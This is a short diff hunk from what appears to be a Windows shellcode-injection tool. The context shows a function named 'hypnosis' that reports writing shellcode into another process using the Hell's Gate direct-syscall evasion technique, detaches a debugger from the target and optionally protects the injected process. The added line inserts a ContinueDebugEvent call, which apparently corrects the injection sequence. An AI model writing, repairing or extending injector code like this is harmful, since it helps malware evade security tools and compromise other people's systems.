@@ -583,6 +583,7 @@ static int hypnosis()
       okay("Successfully wrote %zu bytes of shellcode using Hell's Gate", bytesWritten);
 
       injected = TRUE;
+      ContinueDebugEvent(DbgEvent->dwProcessId, DbgEvent->dwThreadId, DBG_CONTINUE);
       DebugActiveProcessStop(pr_inf.dwProcessId);
 #ifdef PROTECT
       if (!protect_process(pr_inf.hProcess))
